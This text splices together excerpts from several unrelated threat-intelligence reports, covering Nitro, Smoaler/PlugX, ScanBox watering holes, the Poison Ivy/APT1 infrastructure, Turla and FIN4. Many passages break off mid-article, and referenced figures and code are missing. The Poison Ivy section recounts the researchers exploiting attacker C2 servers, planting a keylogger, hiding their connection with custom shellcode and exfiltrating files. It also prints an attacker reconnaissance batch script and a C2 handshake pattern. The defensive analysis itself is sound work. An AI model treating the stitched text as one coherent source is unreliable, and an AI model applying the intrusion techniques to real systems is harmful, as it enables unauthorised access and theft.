Continuing the activity , we discovered the actors had compromised a legitimate website belonging to an international technology company that provides Software Configuration and Change Management ( SCCM ) solutions in mid - May .
The IP resolved by the C2 URL was changed two days after we saw this file to overlap with good.myftp [ .
The filename matches that of the sample in Table 5 , which had a very similar third level C2 domain and the same IP resolution .
This is also a Spindest variant with a PE timestamp of the same day we saw it .
Table 7 As this post and previous cited research show , APT groups such as Nitro will continue to evolve their techniques within the kill chain to avoid detection .
However , they also demonstrate the value of tracking these threats over time , as this allowed us to uncover and properly attribute the new IOCs because Nitro was still re - using old C2 infrastructure with their new malware .
For Palo Alto Networks customers , all of these files were properly identified by WildFire as malware and all of the C2 domains are labeled as threats in both Threat Prevention and URL Filtering systems .
By Gabor Szappanos , Principal Researcher , SophosLabs July 2013 In a recent SophosLabs article about the PlugX malware family , we concluded with these words : There is no doubt that PlugX development will go on , and new features and tricks will be introduced .
We 'll keep an eye on them , and if any interesting or important new features appear , we 'll be sure to let you know .
Fast forward just under two months , and we 're ready to tell you the next stage in this ongoing saga .
The malware family we 'll be looking at in this report is known as Smoaler , and it shares many features with PlugX , notably that : • Smoaler relies on the same vulnerability , CVE-2012 - 0158 .
Thereafter , the new malware follows a different path to the PlugX samples we looked at last time .
We shall analyse the `` what happens next '' component of Smoaler later on .
To clarify the terminology we have used above , remember that : • A vulnerability is a software bug that could potentially be abused to make your computer behave insecurely .
The Smoaler samples seen by SophosLabs were all packaged into files with the extensions .DOC
These extensions usually denote files specific to Microsoft Word that were created by Microsoft Word .
Despite the extensions , however , all the files were actually in Rich Text Format ( RTF ) , a text - based file format for representing documents .
Fig 1 : RTF content of one of the Smoaler samples received by SophosLabs We assume that the attackers chose RTF because its text structure makes it easier to manipulate to create a working exploit for the CVE-2012 - 0158 vulnerability .
As with PlugX , the Smoaler files arrived with Tibetan - themed subject lines : If you open an infected document on an unpatched , unprotected computer , the shellcode in the document will activate and run .
After infecting your computer , the shellcode loads a new copy of Word to display a decoy document that is hidden inside the malicious file .
You will notice only notice a brief flicker when the old instance of Word closes and the new one with the decoy opens .
Fig 2 : Sample Smoaler decoy documents The decoy documents are all unexceptional , uninfected documents with content that matches the filenames given to the malicious RTFs .
The executable code that kicks off infection is the same as was used in PlugX , being byte - for byte identical ( see Fig 3 ) to the shellcode from PlugX 6.0 [ A ] .
Fig 444 : The PlugX 6.0 and Smoaler shellcodes are identical Fig 3 : The PlugX 6.0 and Smoaler shellcodes are identical ￼This shellcode is unusual for its use of LZNT1 compression for the embedded executable payload .
This technique has not been observed in any other APT ( Advanced Persistent Threat ) attacks .
The shellcode decompresses an embedded PE file , writes it into the % TEMP % folder with the name DW20.DLL ( this mimics the filename used by the Dr. Watson utility on Windows that pops up when a program crashes ) , and runs it .
The first - stage payload created by the shellcode contains another program file embedded as data .
It locates this in its own executable file , drops it to disk ( which is where the name dropper comes from for this sort of malware component ) , and runs it .
There are two main sorts of dropper , detected by Sophos as Troj / Plugx - I and Troj / Plugx - K. ( See Fig 4 .
Fig 4 : Side - by - side pseudocode for Smoaler first - stage dropper variants But what happens next is quite different from a PlugX attack , which is why this malware has been given the general name Smoaler , rather than PlugX .
The temporary file dropped by DW20.DLL contains a compressed DLL ( dynamic link library : a special sort of program file ) stored in its resources .
This compressed program is unpacked using code built on the stack .
This component decodes the Command - and - Control ( C & C ) server names that the final malware will use , and saves them to the registry entry HKCU\Software\ Microsoft\Windows Media\XC .
Putting the C & C server names in the registry , rather than in the zombie executable itself , means that if the user becomes suspicious and submits the malware file to a security vendor , the locations of the C & C servers will not be revealed .
The data in the registry entry is obscured by flipping the least significant bit of the non - zero bytes ( i.e .
This provides a light disguise against an inquisitive user .
Fig 5 : Smoaler registry entry used to store C & C server names After storing the C & C names in the registry , the intermediate infector loads the dropped DLL using the LoadLibrary ( ) Windows API call .
The intermediate infector is deleted from the system after execution .
The DLL dropped by the intermediate infector is the principal component of Smoaler .
The DLLs created during infection are variable in size , and huge , ranging from 20 MBytes to 50 MBytes .
This is not because they are complex and packed with functionality : the useful content of Smoaler is less than 40 KBytes .
The bulk of each DLL consists of a number ( two to six ) binary resources of 5 MBytes to 10 MBytes each .
These resources are filled with zero bytes , entirely for the purpose of bulking up the file .
We assume that the purpose of deliberately bloating the main DLL is to disguise its original source , since even a suspicious user might not connect a multi - megabyte DLL with the original infectious RTF of a few hundred kilobytes .
They typically differ in size , because the zero - byte resource padding may vary in each file .
The DLL is added as a registry value called % COMPUTERNAME % in the registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\run .
This provides what is known as persistence , meaning that the malware is automatically re - loaded every time the victim reboots or logs on .
They require a host program inside which to run .
When connecting to its C & C servers , Smoaler injects itself into the process IEXPLORE.EXE .
This is a common trick used by malware to make its traffic appear to originate from a browser , thus arousing much less suspicion .
While running , however , Smoaler keeps a lookout for processes called vsserv.exe , fsdfwd.exe , AvastSvc.exe , uiWatchDog.exe , and avp.exe .
It avoids injecting itself into Internet Explorer if any of them are active .
These processes belong to various security products , so this is a malware precaution often jocularly called anti - anti - virus , intended to avoid suspicious activity that might attract the attention of security software .
After installing itself , Smoaler attempts to connect to its C & C servers .
The domain names it uses are already known from earlier Tibet - related malware attacks : dtl.dnsd.me , dtl.eauto.com and dtl6.moo.com .
Unfortunately , we ca n't say precisely how an infected computer will behave if Smoaler gets this far .
That is because the content that the primary Smoaler DLL fetches from its C & C servers is whatever malware the attackers choose to serve up next .
Worse still , the programs downloaded by Smoaler are not in regular EXE or DLL format .
Firstly , the downloads are encrypted ; secondly , their headers are stripped off so that , even decrypted , they are not immediately obvious as programs ; thirdly , they are loaded directly into , and run directly from , memory , rather then being written to disk and launched via the Windows API .
That means that if you kill off the Smoaler process and delete its primary executable , as you will almost certainly want to do if you find out that you are infected , you may no longer have a complete copy of the malware to submit for analysis .
In this way , the Smoaler authors avoid showing all the cards in their hand at once , in the hope of staying one step ahead .
However , this multi - stage approach also has a significant disadvantage for cybercriminals : there are now multiple points in the attack at which you can spot an anomaly , intervene , and win .
Prevention is better than cure Malware like Smoaler is a strong reminder of why proactivity and prevention are better than cure : once you are infected , it can be hard to go back and unravel what happened , because of the tricks that the malware uses along the way .
By Chris Doman and Tom Lancaster Earlier this year the Japanese language website of one of the world 's largest suppliers of industrial equipment was compromised by a sophisticated threat actor .
Usually in such cases an attacker will use their access to place an exploit kit on the compromised website , delivering malware to visitors - a technique commonly referred to as setting up a ' watering hole ' or ' strategic web compromise ' .
In this case however , rather than relying on malware , the exploit kit was a self - contained key logger that recorded all keystrokes the user performed while on the website .
The framework also facilitates reconnaissance , enabling attackers to exploit vulnerabilities in visitors systems in a more traditional fashion , by pushing & executing malware .
Since the initial post made by AlienVault , we have been actively scouring the web for new instances of the framework .
In this blog , we 're going to discuss four other watering holes which use ScanBox : Table 1 – Selected ScanBox compromises Looking at who was being targeted , we noticed a reasonable variation , including targeting of the Uyghur population in China , US Think Tanks , the Japanese Industrial sector & Korean hospitality .
This variation was our first clue that more than one actor may be using the framework ( although on its own this would not be enough - some actors do target a wide range of organisations , some also focus on specific geographies or sectors ) .
To check if this was the case , we took a deeper dive into each version of the code .
The Framework Whilst all four implementations share the same codebase , there are some minor differences in their implementations .
These differences may show that different attackers are using the ScanBox framework .
We ' ve outlined a few key differences we identified below : Malicious code was delivered in a single block of JavaScript on both webmailgoogle [ .
The domains qoog1e [ .
Selectively loading plugins has the added bonus of slightly reducing access to the attacker 's code to researchers .
Browsers the attackers are not interested in will be served the following placeholder instead of the malicious function : Figure 3 – The empty JavaScript function that the exploit kit delivers when a browser does n't match a targeted browser The following ScanBox plugins are deployed on code.googlecaches [ .
There are further code differences too .
Take for example the different implementations of software enumeration , by identifying whether certain files exist : Figure 4 – Software enumeration on googlecaches [ .
It 's pleasing to see the ScanBox developers using good coding practices , though only if they 're in the office ! Figure 5 – Highlighted section of code from Figure 3 ( Plugin 1 on code.googlecaches [ .
In all other versions only a subsection of the same code is used .
At this point we ' ve established that there are subtle variations between the ScanBox code deployed on different websites , however this could be due to differences in the expected environment of the targets the attackers wish to infect in each case , or upgrades to the framework .
Analysis of associated attacker infrastructure In order to potentially group the activity observed together , we analysed network infrastructure associated with the domains used by the attacker ( s ) deploying the ScanBox framework .
Our analysis showed that there was little overlap both in terms of associated infrastructure and in terms of the malware families associated with that infrastructure .
Summaries of each cluster are given below , whilst full details of the components which made up each are available in the Appendix .
We have been unable to identify any direct overlaps between the clusters , i.e .
Of course this could be due to lack of data points available to us – we welcome any additional data points the community are available to provide which show linkages between the clusters shown below .
Visualisations of each cluster can be seen in the Maltego graphs below : Cluster 1 Cluster 2 Cluster 3 Cluster 4 Conclusions In this post we ' ve identified four affected websites , each of which would draw distinct audiences who would be valuable to different actors .
We ' ve also taken a look at the variations in how the framework was implemented , and found a few subtle differences in the implementations .
Finally , we analysed the associated infrastructure with the attacker domains used in each case , and found no overlap between the clusters of activity .
In a similar fashion to our previous blog entry on potential overlap between APT1 and Putter Panda [ 6 ] , we can attempt to explain these differences with several hypotheses : 1 .
The framework is used by a single group that target widely and upgrade or adapt their code for different targets , and are careful to avoid any overlap in infrastructure or in services used .
Selections of actors share some resources , as per previous observations with similar kits by some security vendors [ 7 ] .
The exploit kits have been used by one group , and taken from public watering holes for their own use by other unrelated persons In our experience , very few attackers have the patience to maintain completely distinct infrastructure with multiple registrars , name servers and hosting providers at the same time , therefore we have a low confidence in hypothesis 1 .
In our view , the hypothesis with the highest probability is that groups of attackers share resources leading to overlaps – this appears to be an ever more common feature – with malware families , builders , and even sometimes hosting infrastructure being shared between disparate actors with a common goal .
Sharing frameworks like ScanBox or other exploit kits allows less sophisticated actors ( who were themselves unable to develop a tool like ScanBox ) to conduct better attacks .
Figure 1 : Attackers working hours ...
The report can be freely downloaded here : http : //intelreport.mandiant.com/ .
Inspired by this article , we have decided to perform our own technical analysis of this case .
In the report , Mandiant explains that the attackers were using a well - known Remote Administration Tool ( RAT ) called Poison Ivy and that they were located in China .
We based our investigation based on those two facts only .
Our purpose was to identify their infrastructures , their methodologies and also the tools they used .
We are convinced that in order to protect our infrastructures against this kind of attacks , we need to analyse , learn and understand the way attackers work .
We would like to thank the incident response teams who have collaborated with us .
Thanks for their help and for their support .
First , we warned the national and/or private Computer Security Incident Response Teams ( CSIRT - CERT ) associated to the targets of the attackers .
Before publishing this report , we have waited for a reasonable time .
Finally , all the servers from which we collected data belonged to the attackers .
We do not attack or try to attack compromised machines .
This RAT can be freely downloaded here : http : //www.poisonivy- rat.com/ .
This RAT will be discussed in the next chapter .
To identify the machines that were using this RAT , we have developed a Poison Ivy scanner .
Here is the code of this scanner : The scanner sends 100 times 0x00 to a specific port and IP .
If in the response the server sends back 100 other bytes followed by the specific data 0x000015D0 , we know that the running service is a Poison Ivy server .
We chose to scan the following ports :  3460 ( default Poison Ivy port )  80 ( HTTP port )  443 ( HTTPS port )  8080 ( alternate HTTP port ) .
We decided to scan a wide IP range located in Hong Kong .
That explains why the scanner did not identify all the C & C servers at certain moments of the day .
However , using this parameter , we were able to identify their working hours .
Here is the average working hours for a week ( the hour on the graph is UTC+1 ) : Generally , the attackers worked between 2AM and 10AM from Monday to Saturday included .
This RAT is well documented on the Internet .
Here is a short list of the features it provides : 3.2 Remote code execution vulnerability An exploitable vulnerability has been discovered by Andrzej Dereszowski from SIGNAL 11 .
The description of the vulnerability can be found here : http : //www.signal11.eu / en / research / articles/ targeted_2010.pdf .
This vulnerability allows the remote execution of arbitrary code on the command & control server .
Metasploit framework provides an exploit to use this vulnerability .
The code is available here : http : //dev.metasploit.com / redmine / projects / framework / repository / entry/ modules / exploits / windows / misc / poisonivy_bof.rb .
This exploit did not work in our context .
The exploit has two possible exploitations : - by using the default password : admin - by using brute force As the two methods did not work ; we created a third one .
This method consists of finding the real password used for the encryption .
Our homemade exploit with an option for the password is available in Appendix .
For information , an additional Ruby package is needed to use the camellia cipher .
The package can be installed using the gem command : root @ alien : # gem install camellia - rb The next step was to find the password used to encrypt the communication .
The password is set by the administrator and its default value is `` admin '' .
After a quick search on the Internet , we know that Poison Ivy uses Camellia as encryption algorithm .
The encryption is made with 16 bytes blocks .
So we decided to choose the following approach : - Send 100 bytes ( with 0x00 ) to the daemon ( same than in our scanner ) - Get the first 16 bytes as result from the server Here is the formula of the result : Result = Camellia ( 16 * 0x00 , key ) The result is not a printable value .
Thus , we decided to make a base64 of this value and add the flag $ camellia $ to identify the algorithm .
Here is an example of result : $ camellia $ ItGoyeyQIvPjT / qBoDKQZg== To get the key , we developed a `` John the Ripper '' extension .
The source code can be downloaded here : http : //www.openwall.com / john/ .
The code source of the `` John the Ripper '' plugin to crack camellia hashes by using the OpenSSL library is available in the appendix .
After compiling `` John the Ripper '' , a new format is available : camellia .
Here is an example of a brute force session : rootbsd @ alien : ~/john-1.7.9-jumbo-7/run $ cat test.txt $ camellia $ ItGoyeyQIvPjT / qBoDKQZg== rootbsd @ alien : ~/john-1.7.9-jumbo-7/run $ ./john
This key must be used in our homemade Metasploit exploit .
We attacked a server with the IP X.X.X.X ( identified during the scan ) and the meterpreter endpoint IP address was Y.Y.Y.Y .
We concluded that the Poison Ivy daemon was hidden behind a proxy server , by using port forwarding to hide the real IP of the command & control server .
We could also identify that the vendor ID of the MAC address is VMWare .
By listing the processes , we are able to validate this hypothesis : 3.5 Shellcode After a few days the attackers detected our presence on their systems , particularly because of the network connections between their Poison Ivy machines and our machines .
Using the netstat command they were able to detect our connection .
Basically , the Poison Ivy server only had connections originating from the proxy server and no connection from any other IP .
In order to stay stealth we had to connect to the Poison Ivy server through the proxy server .
To establish this connection we decided to create our own shellcode .
The principle of our shellcode is as follows : - Once injected in a process , the shellcode looks for open sockets ; - Once a opened socket is detected , this socket is closed ; - After , the shellcode binds itself on the previous open port ; - From now on , we are going to use the same technique than the one used in meterpreter ( bind_tcp ) .
Our shellcode goal is to close the Poison Ivy daemon 's socket and then open our own socket on the same port .
Once our socket is opened we can use the proxy chains provided by the attackers to connect to the Poison Ivy server .
In this case , when attackers checked the opened connections using netstat they could not identify our connection since it appeared to be originating from an infected target … The source code of the shellcode can be found in appendix .
Figure 2 : Network schema The infected machines communicate with the proxy through the Internet .
The proxy server will forward the network packets to the Poison Ivy server .
The proxy feature is done by an executable called xport.exe .
This executable can encode network traffic using a xor operation .
This feature requires having the executable running on both machines : the proxy and the Poison Ivy server .
The syntax on the proxy server is : xport.exe Proxy_ip proxy_port Poison_Ivy_ip Poison_Ivy_port number The argument number can either be set to 1 or 2 and represents the two different encoding keys .
The syntax on the Poison Ivy server is : xport.exe Poison_Ivy_ip Poison_Ivy_port localhost Poison_Ivy_daemon_port number The Poison Ivy server is managed by the attackers through a VMWare remote desktop , so that we were not able to get the real IP address of the attacker .
During our investigation , we identified an established Remote Desktop Protocol ( RDP ) connection between the Poison Ivy server and the proxy server .
We decided to install a key - logger on the Poison Ivy server that allowed us to see credentials to remotely connect to the proxy server .
Since the attackers use RDP to manage the proxy server and that we had access , we copied the Windows event logs .
Those logs contained all IPs which established a successful RDP authentication .
We identified more than 350 unique IPs : rootbsd @ alien : ~/APT1 $ cat list_ip.txt | sort –u | wc -l 384 We suppose that this list also contains Poison Ivy servers IPs and maybe IPs of attackers who inadvertently connect directly to the proxy ) .
Here is the screenshot of the proxy RDP authentication : Figure 3 : Proxy server login window Here is the screenshot of the Poison Ivy interface : Figure 4 : Poison Ivy interface with the list of connected machines Here is the screenshot of an attacker using a remote shell to an infected target : Figure 5 : Poison Ivy interface with a shell Using those accesses , we managed to exfiltrate a massive amount of files , event logs , netstat outputs … The interesting information can be divided in two categories : - Information about the tools used by the attackers ; - Information about the targets .
The RAT called Terminator will be described in the next chapter .
We found a batch script similar to the one described in Mandiant 's report : @ echo off echo % computername % > > c : \recycler\ % computername % _ base.dat qwinsta > > c : \recycler\ % computername % _ base.dat date /t > > c : \recycler\ % computername % _ base.dat time /t > > c : \recycler\ % computername % _ base.dat ipconfig /all > > c : \recycler\ % computername % _ base.dat nbtstat -n > > c : \recycler\ % computername % _ base.dat systeminfo > > c : \recycler\ % computername % _ base.dat set > > c : \recycler\ % computername % _ base.dat net share > > c : \recycler\ % computername % _ base.dat net start > > c : \recycler\ % computername % _ base.dat tasklist /v > > c : \recycler\ % computername % _ base.dat netstat -ano > > c : \recycler\ % computername % _ base.dat dir c : \ /a > > c : \recycler\ % computername % _ base.dat dir d : \ /a > > c : \recycler\ % computername % _ base.dat dir c : \progra~1 > > c : \recycler\ % computername % _ base.dat dir c : \docume~1 > > c : \recycler\ % computername % _ base.dat net view /domain > > c : \recycler\ % computername % _ base.dat dir /a /s c : \ > > c : \recycler\ % computername % _ filelist.dat dir /a /s d : \ > > c : \recycler\ % computername % _ filelist.dat del c : \recycler\base.bat The purpose of this batch script is to get information about an infected workstation .
In addition , we found a directory with the official SecureCrt , which is an SSH client .
We also found the SysInternals suite from Microsoft .
When a target discovers the IP address of a proxy , this address is reassigned to another target .
That 's why it is primordial to share the C & C servers IPs with our partners .
The targets were private and public companies , political institutions , activists , associations or reporters .
On the Poison Ivy server , a directory is created for every target .
Within this directory , a directory for each infected machine was created .
The naming convention for those directories is HOSTNAME^USERNAME .
Here is an example : E : \companyABCD\alien^rootbsd\ In those directories files are not sorted in any specific manner .
The documents types are : - .PPT
Among those documents , we found : - Network diagrams ; - Internal IP / user / password combination ( local administrator , domain administrator , root , web , webcam … ) ; - Map of the building with digital code to open doors ; - Security incident listings ; - Security policies ; - … The sensitive documents were password protected .
The passwords pattern is [ a - z ] { 3,4 } [ 0 - 9 ] { 3,4 } , so it was easy to brute force them in reasonable time .
Here is an example of a network diagram .
Figure 6 : Example of network target diagram 5.1 Description On one of the proxy server , we identified a binary called Terminator3.6.exe .
After a quick analysis we noticed that this binary is the server side of a homemade Remote Administration Tool ( RAT ) .
After analysis , we identified that this sample corresponds to Fakem RAT discovered by Trendmicro in January 2013 .
Additional information can be found there : http : //www.trendmicro.com / cloud- content / us / pdfs / security - intelligence / white - papers / wp - fakem - rat.pdf .
We were lucky enough to find the client side ( the malware ) on the same server .
These two binaries allowed us to test the product and see how it works .
A CRC is generated based on the supplied password .
Here is the algorithm of this CRC : Figure 8 : Terminator CRC algorithm After this operation , a xor , then a compare operation is done : Figure 9 : Terminator xor and compare operation on the password To obtain the password , we developed a brute forcer ; the code source is available in the appendix .
The first argument is the maximum number or characters and the second is the value used in the comparison ( available in the ASM code ) .
The malware waits for a library ( DLL ) sent from the command and control .
The attackers then choose a specific feature , and send the associated DLL file to the infected machine .
The libraries are stored in the server 's executable file as resources .
The resources are not encrypted but the libraries headers are removed .
The communication scheme is really weird , the infected machine ( the client ) sent HTML to the C & C .
The communication starts with : < html > < title > 12356 < /title > < body > This string can be identified in the memory of the process .
The pattern of the connection is : stage = `` < html > < title > 12356 < /title > < body > '' stage + = `` \xa0\xf4\xf6\xf6 '' stage + = `` \xf6 '' * ( 0x400 - len ( stage ) ) Here is the main RAT 's GUI : Figure 10 : Terminator : starting interface We can choose between three different protocols : Figure 11 : Terminator : Protocol and port choice When a machine is infected , it appears on the GUI : Figure 12 : Terminator : List of infected machines Below is the interface that is shown once a machine has been selected : Figure 13 : Terminator : List of features On the screenshot we can see the 10 available features .
Each one of the features matches a DLL file .
To upload a DLL to the infected machine ( and enable its feature ) , we have to tick the feature 's checkbox and then click on `` Upload Plug '' .
For example , if we choose `` Shell Plug - ins '' , the button '' Shell '' ( on the left pane ) becomes enabled .
Here is the list of available features : - File management ; - Process management ; - Shell access ; - Screenshot ; - Registry management ; - Services management ; - Get information of the infected machine ; - Keylogger ; - Dump password hashes in memory ; - View user 's files .
Here are some screenshots of the administration interface : Figure 14 : Terminator : List of processes on the infected machine Figure 15 : Terminator : List of opened ports on the infected machine Figure 16 : Terminator : Remote shell on the infected machine Figure 17 : Terminator : Registry access to the infected machine Figure 18 : Terminator : Services management on the infected machine Figure 19 : Terminator : Information about the infected machine Figure 20 : Terminator : Installed software on the infected machine 5.4 Scanner We decided to create a scanner to identify the servers which were running Terminator .
Here is the code to identify the service : With this script , we identified more C & C servers managed by the attackers , which allowed us to refine our scheme of the attacker 's infrastructure .
We created an exploit to remotely take control of the command & control .
The code source of the Metasploit exploit is available in the appendix . The exploitation provided the following result .
Classification Public In this report , we document how we could reveal the methodology and tools used by an attacker .
The used technologies were commonly known , which supports our fears that such kind of APT affects more and more infrastructures .
Among them we can find public companies , governmental and political institutions … The most efficient and proactive way to protect an infrastructure and fight back the attackers is to understand their attacks and the way they work .
An interesting fact is to see the professionalization in this field .
Here are some key facts about the attackers : - More than 300 servers - Use of proxy servers to hide their activities ; - one server per target ; - custom made malware - working hours , such as office employees - really good organization - … Infrastructures such as the one detailed in this report are expensive but Intelligence is a real issue .
People or organisations seem do not hesitate to pay for such illegal information theft .
Please see the Metasploit # web site for more information on licensing and terms of use .
Several security researchers and Western intelligence officers say they believe the malware , widely known as Turla , is the work of the Russian government and linked to the same software used to launch a massive breach on the U.S. military uncovered in 2008 .
It was also linked to a previously known , massive global cyber spying operation dubbed Red October targeting diplomatic , military and nuclear research networks .
Those assessments were based on analysis of tactics employed by hackers , along with technical indicators and the victims they targeted .
It has Russian paw prints all over it , '' said Jim Lewis , a former U.S. foreign service officer , now senior fellow at the Center for Strategic and International Studies in Washington .
However , security experts caution that while the case for saying Turla looks Russian may be strong , it is impossible to confirm those suspicions unless Moscow claims responsibility .
Developers often use techniques to cloud their identity .
The threat surfaced this week after a little known German anti-­virus firm , G Data , published a report on the virus , which it called Uroburos , the name text in the code that may be a reference to the Greek symbol of a serpent eating its own tail .
Experts in state-­sponsored cyber attacks say that Russian government-­backed hackers are known for being highly disciplined , adept at hiding their tracks , extremely effective at maintaining control of infected networks and more selective in choosing targets than their Chinese counterparts .
When they recognize that someone is onto them , they just go dormant , '' said one expert who helps victims of state-­sponsored hacking .
A former Western intelligence official commented : '' They can draw on some very high grade programmers and engineers , including the many who work for organized criminal groups , but also function as privateers .
On Friday , Britain 's BAE Systems Applied Intelligence -­ the cyber arm of Britain 's premier defense contractor -­ published its own research on the spyware , which it called '' snake .
Symantec Corp estimates up to 1,000 networks have been infected by Turla and a related virus , Agent . BTZ .
It named no victims , saying only that most were government computers .
It obtained smaller numbers from other countries .
Hackers use Turla to establish a hidden foothold in infected networks from which they can search other computers , store stolen information , then transmit data back to their servers .
Security firms that are monitoring the threat have said the operation 's sophistication suggests it was likely backed by a nation state and that technical indicators make them believe it is the work of Russian developers .
European governments have long welcomed U.S. help against Kremlin spying , but were infuriated last year to discover the scale of surveillance by America 's National Security Agency that stretched also to their own territory .
It was used in a massive cyber espionage operation on U.S. Central Command that surfaced in 2008 and is one of the most serious U.S. breaches to date .
While Washington never formally attributed blame , several U.S. officials have told Reuters they believed it was the work of Russia .
Hypponen said Agent . BTZ was initially found in a military network of a European NATO state in 2008 , but gave no details .
F-­ Secure is credited with naming that piece of malware in 2008 , though researchers believe it was created already in 2006 .
Kaspersky Lab researcher Kurt Baumgartner said he believes Turla and Agent . BTZ are related to Red October , which suddenly shut down after his firm reported on it in January 2013 .
Eric Chien , technical director with Symantec Security Response , described Turla as '' the evolution '' of Agent . BTZ .
Finland said its Foreign Ministry computer systems had been penetrated by an attack last year but would not elaborate .
Sweden 's National Defence Radio Establishment said cyber espionage was '' more common than people think '' , adding that it had discovered multiple attacks against authorities , governments and universities , some only detected after several years .
Government sources in the Czech Republic , Estonia , Poland and Romania said Turla had not affected them directly .
Other European governments contacted by Reuters declined comment .
G Data spokesman Eddy Willems declined to name any victims or identify the author of the report , saying the firm was concerned the group behind Turla might attempt to harm him .
Jaime Blasco , director of AlienVault Labs , said that Turla was more of a '' framework '' for espionage than simply malware .
The malware is a '' root kit '' that hides the presence of the spying operation and also creates a hidden , encrypted file system to store stolen data and tools used by the attackers , he said .
Those tools include password stealers , tiny programs for gathering information about the system and document stealers .
The operators can download specialized tools onto an infected system , adding any functionality they want by including it in the encrypted file system , Blasco said .
They have used dozens of different '' command and control '' servers located in countries around the world to control infected systems , according to Symantec , whose researchers have helped identify and shut down some of those systems .
Researchers say Turla 's code is regularly updated , including changes to avoid detection as anti-­virus companies detect new strains .
Chien said that in some cases when a command and control server was taken offline , Turla 's operators have quickly pushed out new versions of the malware that directed infected computers to new command and control servers .
The group , which we call FIN4 , appears to have a deep familiarity with business deals and corporate communications , and their effects on financial markets .
Operating since at least mid-2013 , FIN4 distinctly focuses on compromising the accounts of individuals who possess non - public information about merger and acquisition ( M & A ) deals and major market - moving announcements , particularly in the healthcare and pharmaceutical industries .
We are able to characterize FIN4 's activity from the incidents to which we have responded in our clients ' networks , FIN4 's attempts to compromise our managed service clients , our product detection data , and further independent research .
Our visibility into FIN4 's activities is limited to their network operations ; we can only surmise how they may be using and potentially benefiting from the valuable information they are able to obtain .
However one fact remains clear : access to insider information that could make or break stock prices for dozens of publicly traded companies could surely put FIN4 at a considerable trading advantage .
F ireEye believes FIN4 intentionally targets individuals who have inside information about impending market catalysts - events that will cause the price of stocks to rise or fall substantially in a short period of time .
Since at least mid-2013 , FIN4 has pursued targets at more than 100 organizations , over two - thirds of which are public healthcare and pharmaceutical companies .
The remaining targets include advisory firms that represent public companies and a handful of public companies in other sectors closely followed by market watchers .
All but three of the public companies are listed on the NYSE or NASDAQ , with the remaining three listed on non - US exchanges .
In order to get useful inside information , FIN4 compromises the email accounts of individuals who regularly communicate about market- moving , non - public matters .
The group frequently employs M & A - themed and SEC - themed lures with Visual Basic for Applications ( VBA ) macros implemented to steal the usernames and passwords of these key individuals .
Additionally , FIN4 has included links to fake Outlook Web App ( OWA ) login pages designed to capture the user 's credentials .
Once equipped with the credentials , FIN4 then has access to real - time email communications - and presumably insight into potential deals and their timing .
Many of FIN4 's lures appeared to be stolen documents from actual deal discussions that the group then weaponized and sent to individuals directly involved in the deal .
In some cases , the discussions were public knowledge and widely reported in the media , while others were still in the early exploration and due diligence phases .
In one instance , we observed FIN4 simultaneously target five different organizations involved in a single acquisition discussion .
The group targeted individuals at the five firms several months before the organizations ' involvement in the acquisition talks went public .
Lasering in on Healthcare and Pharmaceuticals We believe FIN4 heavily targets healthcare and pharmaceutical companies as stocks in these industries can move dramatically in response to news of clinical trial results , regulatory decisions , or safety and legal issues .
In fact , many high - profile insider trading cases involve the pharmaceutical sector .
We ' ve observed FIN4 access information on a wide variety of issues - including drug development , insurance reimbursement rates , and pending legal cases - all of which can significantly influence the price of healthcare industry stocks .
In one case , FIN4 targeted employees involved in Medicaid rebates and government purchasing processes - these issues can heavily influence stock prices .
Healthcare and pharmaceutical companies depend heavily on the decisions of large third party payers ( like Medicaid ) whose purchasing power and rebate decisions can make or break a company 's earnings .
Keeping it Organized FIN4 organizes the targets of their activity with over 70 unique `` campaign codes '' to designate the employer of the individuals they target , or in some cases the generic roles the targeted individuals play within that organization .
These campaign codes function as labels that FIN4 uses to identify the origin of usernames and passwords stolen from their targets .
These campaign codes are transmitted to FIN4 's command and control ( C2 ) servers along with stolen credentials .
For example : • CEO_CFO_COO_CORPDEV • SCIENTISTS_AND_RESEARCH • < PHARMACEUTICAL COMPANY NAME > • < ADVISORY FIRM NAME > Figure 3 : Example of FIN4 Campaign Code Figure 4 : FIN4 phishing email to an executive A fter identifying a target , FIN4 frequently embeds VBA macros into a previously stolen Office document .
The embedded macro displays a dialog box that mimics the Windows Authentication prompt for the user to enter their domain credentials .
These credentials are transmitted to a server controlled by the group , allowing FIN4 to hijack that user 's email account .
In several instances , FIN4 has included links to fake OWA login pages in their phishing emails instead ( Figure 4 ) .
This would be useful for targeting organizations that may have disabled VBA macros in Microsoft Office .
Their spearphishing themes appear to be written by native English speakers familiar with both investment terminology and the inner workings of public companies .
Figure 4 shows the group 's strong command of an executive 's concerns over illicit public disclosure , particularly over executive incompetence and compensation issues .
This email came from an account that FIN4 hijacked at a public company and includes several watchwords : `` disclosure '' of '' confidential company information regarding pending transactions .
Figure 5 : Generic FIN4 Lure Document While a large share of FIN4 's lures are previously stolen confidential company documents , the group occasionally uses generic lures of interest to the investment community ( Figure 5 ) .
We ' ve seen the actors seamlessly inject themselves into email threads .
The actors have also Bcc 'd all recipients , making it even more difficult for recipients to decipher a malicious email from a legitimate one .
A Fly on Many Walls In several of our investigations , FIN4 targeted multiple parties involved in a business deal , including law firms , consultants , and public companies .
In one instance , FIN4 appeared to leverage its previously - acquired access to email accounts at an advisory firm ( `` Advisory Firm A '' ) to collect data during a potential acquisition of one of Advisory Firm A 's clients ( `` Public Company A '' ) .
After news of the possible acquisition was made public , Public Company A 's stock price varied significantly .
It is likely that FIN4 used the inside information they had to capitalize on these stock fluctuations .
Figure 6 : Outlook rule to filter emails Evading Detection FIN4 has been observed creating a rule in victims ' Microsoft Outlook accounts that automatically deletes any emails that contain words such as `` hacked '' , `` phish '' , `` malware '' , etc .
The group likely implements these rules to prevent compromised victims from receiving replies from intended targets that their email account may be compromised , and likely buys FIN4 extra time before victim organizations detect their activities .
Conclusion If FIN4 's activities are indeed part of a sustained effort to gain advance access to market - moving information , it would not be the first time that network intrusions have played a role in an insider trading case .
However the scale of FIN4 's operations , with targets at more than 100 public companies , coupled with their tactic of going after key individuals ' emails , sets this group apart .
Our visibility into FIN4 is limited to their network operations , so we can not say for certain what happens after they gain access to insider information .
What we can say is that FIN4 's network activities must reap enough benefit to make these operations worth supporting for over a year - and in fact , FIN4 continues to compromise new victims as we finish this report .
Using VBA macros , they embed malicious code into already existing and legitimate company documents .
Embedded in each Microsoft Word or Excel document is a malicious macro that prompts the user for their Outlook credentials .
We have also observed this group send emails with links to fake Outlook Web App ( OWA ) login pages that will also steal the user 's credentials , however we have not observed this tactic in recent months .
The code in Module1 contains the information needed to communicate with the C2 server ( Figure 7 ) .
